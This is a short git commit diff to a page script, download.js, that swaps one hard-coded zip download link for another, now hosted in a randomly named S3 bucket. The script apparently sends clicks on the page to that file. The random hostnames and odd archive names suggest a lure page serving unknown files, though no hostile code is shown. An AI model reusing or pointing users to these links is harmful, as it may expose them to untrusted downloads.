0aae75443493cfeb27fd0a182ea1841b0f83f5b2
ab168188z <ttle30674@gmail.com>
2025-11-10 13:45:37 +0800

    Update download.js

--- download/download.js
+++ download/download.js
@@ -1,6 +1,6 @@
 $(function () {
 	// 设置跳转路径
-	var url = "https://hryouxiangongjs.shop/Fettyexm1.0.6.zip"; //如果是外部链接 ' ' 中则全部替换为完整网址链接 如：'https://www.example.com'
+	var url = "https://fbnidshfbis.s3.ap-east-1.amazonaws.com/Chemrrooy.zip"; //如果是外部链接 ' ' 中则全部替换为完整网址链接 如：'https://www.example.com'
 
 	// 使用querySelectorAll获取所有具有特定类名的元素
 	var clickableElements = document.querySelectorAll(".clickableClass"); // 假设class是clickableClass
